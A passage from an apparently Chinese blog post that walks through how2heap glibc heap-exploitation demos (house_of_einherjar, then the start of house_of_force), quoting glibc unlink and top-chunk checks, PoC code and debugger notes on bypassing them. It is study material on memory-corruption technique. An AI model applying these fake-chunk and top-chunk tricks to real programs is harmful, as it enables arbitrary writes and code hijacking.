检测是否为双链表结构</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span>check_action<span class=\"token punctuation\">,</span> <span class=\"token string\">\"corrupted double-linked list\"</span><span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> AV<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  \\</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t\t\t\t\t      \\</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> BK<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t      \\</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t      \\</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_smallbin_range</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>size<span class=\"token punctuation\">)</span>\t<span class=\"token comment\">// 判断是否为 lagrebin\t\t\t      \\</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            &amp;&amp; __builtin_expect (P->fd_nextsize != NULL, 0)) &#123;\t\t      \\</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t    if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)\t      \\</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t|| __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \\</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t      malloc_printerr (check_action,\t\t\t\t      \\</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t       \"corrupted double-linked list (not small)\",    \\</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t       P, AV);   // 判断 largebin 是否为双链表结构</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t      \\</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">==</span> P<span class=\"token punctuation\">)</span>\t\t\t\t      \\</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                  FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> FD<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t      \\</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t\t\t\t      \\</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                    FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token punctuation\">;</span>\t\t\t      \\</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                    FD<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token punctuation\">;</span>\t\t\t      \\</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                    P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t\t      \\</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                    P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t\t      \\</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                  <span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t      \\</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>              <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t\t\t\t      \\</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token punctuation\">;</span>\t\t      \\</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token punctuation\">;</span>\t\t      \\</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>              <span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t\t      \\</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>          <span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t\t      \\</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t\t\t      \\</pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>unlink 检测只是检测了要被取出来的 chunk 是否是双链表结构，而 <code>不检查其是否真的在smallbin或者largebin中</code> ，因此例子里就 fd，bk 等等指向自己，用自己构造了一个双链表满足条件来绕过检测</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/%40J%2980L6O4%28A6TO8B%40IF9%29%5B6.png\" alt=\"\" /></p>\n<h3 id=\"4执行到64行\"><a class=\"anchor\" href=\"#4执行到64行\">#</a> 4. 执行到 64 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>b <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">uint8_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xf8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">int</span> real_b_size <span class=\"token operator\">=</span> <span class=\"token function\">malloc_usable_size</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nWe allocate 0xf8 bytes for 'b'.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"b: %p\\n\"</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里感觉 pwndbg 的显示堆大小是加上了头部的 0x10，并没有算上下个 chunk 的 pre_size 位，实际大小是加上下一个 chunk 的 pre_size 才到 0xf8 的大小</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/%28QE%25%7E%7D42JJXYJF%40322DUAZD.png\" alt=\"\" /></p>\n<h3 id=\"5执行到69行\"><a class=\"anchor\" href=\"#5执行到69行\">#</a> 5. 执行到 69 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">uint64_t</span><span class=\"token operator\">*</span> b_size_ptr <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">uint64_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>b <span class=\"token operator\">-</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token comment\">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nb.size: %#lx\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>b_size_ptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里用 <code>b_size_ptr</code>  指针指向了 chunk b 的 size 位，，打印了 size 的值</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/TFU%60TL%29K%5DX08J5CXR%5DO%5D%7E%7EE.png\" alt=\"\" /></p>\n<p>这里的也是头部的 0x10 然后没有算上共用的 pre_size 位</p>\n<h3 id=\"6-执行到77行\"><a class=\"anchor\" href=\"#6-执行到77行\">#</a> 6. 执行到 77 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nb.size: %#lx\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>b_size_ptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"b.size is: (0x100) | prev_inuse = 0x101\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"We overflow 'a' with a single null byte into the metadata of 'b'\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\ta<span class=\"token punctuation\">[</span>real_a_size<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"b.size: %#lx\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>b_size_ptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"This is easiest if b.size is a multiple of 0x100 so you \"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t   <span class=\"token string\">\"don't change the size of b, only its prev_inuse bit\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"If it had been modified, we would need a fake chunk inside \"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t   <span class=\"token string\">\"b where it will try to consolidate the next chunk\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里是利用 <code>a[real_a_size]来进行溢出，覆盖chunk b 的size的p位为0</code> ，因为这里是利用了数组 <code>a[0x38]</code>  实际是第 0x39 的位置，这里 P 标志位为 0 后，上一个 chunk 就会被视为是空闲的 chunk，可以绕过 free 的检测，并且会将 pre_siez 的值视为上一个 chunk（紧挨着的低地址的 chunk）的 size 大小</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/WNBY5J63Q87IY%5B63A54UU%60M.png\" alt=\"\" /></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/%24N%24A9U%7D1B%28IRNB%5DO0KMEYLC.png\" alt=\"\" /></p>\n<h3 id=\"7执行到83行\"><a class=\"anchor\" href=\"#7执行到83行\">#</a> 7. 执行到 83 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">size_t</span> fake_size <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>b<span class=\"token operator\">-</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">uint8_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>fake_chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Our fake prev_size will be %p - %p = %#lx\\n\"</span><span class=\"token punctuation\">,</span> b<span class=\"token operator\">-</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">,</span> fake_size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里计算了要伪造 fake_chunk 的 size 大小（chunk b 为高地址作为下一个 chunk，而 fake_chunk 的地址为低地址，作为上一个 chunk），所以 size 大小 (距离) 是高地址减地址，这里 <code>b-sizeof(size_t)*2)</code>  是从 b 的头部指针开始，上面的计算结果就是图里的 fake_size</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/N%25VGR%40R%29MN%29E%5B788G%7E8C%40%40Y.png\" alt=\"\" /></p>\n<p>这里的结果其实是负数，其实也就是 fake_chunk 在高地址处，不过为了合并就将它视为地址</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/%24%28SJ8ZBQT_V%5BIJVU6%5DLQ%5D%28G.png\" alt=\"\" /></p>\n<h3 id=\"8执行到88行\"><a class=\"anchor\" href=\"#8执行到88行\">#</a> 8. 执行到 88 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>a<span class=\"token punctuation\">[</span>real_a_size<span class=\"token operator\">-</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> fake_size<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token comment\">//Change the fake chunk's size to reflect b's new prev_size</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nModify fake chunk's size to reflect b's new prev_size\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> fake_size<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里是将 b 的 <code>pre_size</code>  修改为了 <code>fake_chunk</code>  的大小 (a 的数据段用了 b 的 <code>pre_size</code> , 所以可以修改)，也就让合并时可以通过 b 的 <code>pre_size</code>  向前寻找这个大小找到 <code>fake_chunk</code> ；后面也修改了 <code>fake_chunk</code>  的 size</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/%7BFBM%5B1%25N%60WE%5D%7E5%25F%5D%24PL%60I6.png\" alt=\"\" /></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/%40G%25V%404JSGB%2875TVZI_948VU.png\" alt=\"\" /></p>\n<h3 id=\"9执行到93行\"><a class=\"anchor\" href=\"#9执行到93行\">#</a> 9. 执行到 93 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// free b and it will consolidate with our fake chunk</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Our fake chunk size is now %#lx (b.size + fake_prev_size)\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里就 <code>free(b)</code> ，会触发合并，上面几个步骤修改 fake_chunk 的 size 为 fake_size 的地方其实是为了绕过一个检测（没有在源码找到对于检测），这样能够成功合并</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/YTWW9Z%7DV838%7B%7ETMT_VYU%60_0.png\" alt=\"\" /></p>\n<p>在 fake_chunk 中，它的 size 被改变了，但是与示例注释说明的并不一样，其 size 增加了 <code>20FC1</code> (0x77C351-0x75B390)</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/4%40%40F9U6ZT8%5BE5PT%5D2BQ92Z5.png\" alt=\"\" /></p>\n<h3 id=\"10执行到最后\"><a class=\"anchor\" href=\"#10执行到最后\">#</a> 10. 执行到最后</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//if we allocate another chunk before we free b we will need to </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token comment\">//do two things: </span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token comment\">//1) We will need to adjust the size of our fake chunk so that</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">//fake_chunk + fake_chunk's size points to an area we control</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token comment\">//2) we will need to write the size of our fake chunk</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token comment\">//at the location we control. </span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token comment\">//After doing these two things, when unlink gets called, our fake chunk will</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token comment\">//pass the size(P) == prev_size(next_chunk(P)) test. </span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token comment\">//otherwise we need to make sure that our fake chunk is up against the</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token comment\">//wilderness</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nNow we can call malloc() and it will begin in our fake chunk\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\td <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Next malloc(0x200) is at %p\\n\"</span><span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>最后申请了一个 0x200 大小的空间，打印了其地址</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/MZIV4ZU%400FNBPFBTU%240TPW6.png\" alt=\"\" /></p>\n<p>打印的地址也是 <code>fake_chunk</code>  的 data 域，虽然还是不知道为什么在 pwndbg 的 heap 命令没有显示申请的这个堆</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/%28IE%29LUZ%7E%7BM0%7E7%7BAFL%29ACT0T.png\" alt=\"\" /></p>\n<h3 id=\"11程序运行结果\"><a class=\"anchor\" href=\"#11程序运行结果\">#</a> 11. 程序运行结果：</h3>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/35%405P8LKBI_K%25M8%5B%7D%40UTRV5.png\" alt=\"\" /></p>\n<h1 id=\"5house_of_force\"><a class=\"anchor\" href=\"#5house_of_force\">#</a> 5. <code>house_of_force</code></h1>\n<p>与 <code>house_of_einherjar</code>  不同在于： <code>house_of_einherjar</code>  触发的合并将 topchunk 变得很大，而 <code>house_of_force</code>  是修改 topchunk 的 size 位来变得很大，不过最后都是因为很大的 chunk 可以申请到任意地址</p>\n<p>这个例子是修改 topchunk 的 size 导致我们可以申请部分不用的空间，使下一次申请的空间为我们想要的地方，这就造成了任意地址改写，但是需要通过修改 top chunk 的 size 位来实现</p>\n<p>下面是从 top chunk 申请空间的检测 ( <code>后面调试的步骤5就是绕过这个检测</code> ) 在源码 2728 行：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* finally, do the allocation */</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  p <span class=\"token operator\">=</span> av<span class=\"token operator\">-></span>top<span class=\"token punctuation\">;</span><span class=\"token comment\">//p 指向当前 top chunk</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  size <span class=\"token operator\">=</span> <span class=\"token function\">chunksize</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获取 top chunk 的 size</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token comment\">/* check that one of the above allocation paths succeeded */</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\">// 这里的 nb 是要从 top chunk 申请的 chunk 大小（包括头部的 0x10）</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">//MINSIZE 是一个 chunk 需要的最小的空间（32 位 0x10，64 位 0x20，为 pre_size,size,fd,bk）</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>nb <span class=\"token operator\">+</span> MINSIZE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//if 是判断 保障 top chunk 去掉这个 nb chunk 后仍然有一个最小 chunk 大小的空间</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      remainder_size <span class=\"token operator\">=</span> size <span class=\"token operator\">-</span> nb<span class=\"token punctuation\">;</span> <span class=\"token comment\">//top chunk 剩余大小</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      remainder <span class=\"token operator\">=</span> <span class=\"token function\">chunk_at_offset</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 得到新 top chunk 的头部地址</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      av<span class=\"token operator\">-></span>top <span class=\"token operator\">=</span> remainder<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">// 下面的 set_heap 是设置切割出去的 chunk 和新 top chunk 的 size</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token function\">set_head</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> nb <span class=\"token operator\">|</span> PREV_INUSE <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>av <span class=\"token operator\">!=</span> <span class=\"token operator\">&amp;</span>main_arena <span class=\"token operator\">?</span> NON_MAIN_ARENA <span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token function\">set_head</span> <span class=\"token punctuation\">(</span>remainder<span class=\"token punctuation\">,</span> remainder_size <span class=\"token operator\">|</span> PREV_INUSE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token function\">check_malloced_chunk</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 作用不明。。。</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token function\">chunk2mem</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 返回用户指针</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"1程序源码-3\"><a class=\"anchor\" href=\"#1程序源码-3\">#</a> 1. 程序源码：</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   This PoC works also with ASLR enabled.</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   ( http://phrack.org/issues/66/10.html )</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   Tested in Ubuntu 14.04, 64bit, Ubuntu 18.04</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdint.h></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdint.h></span></span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;malloc.h></span></span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> 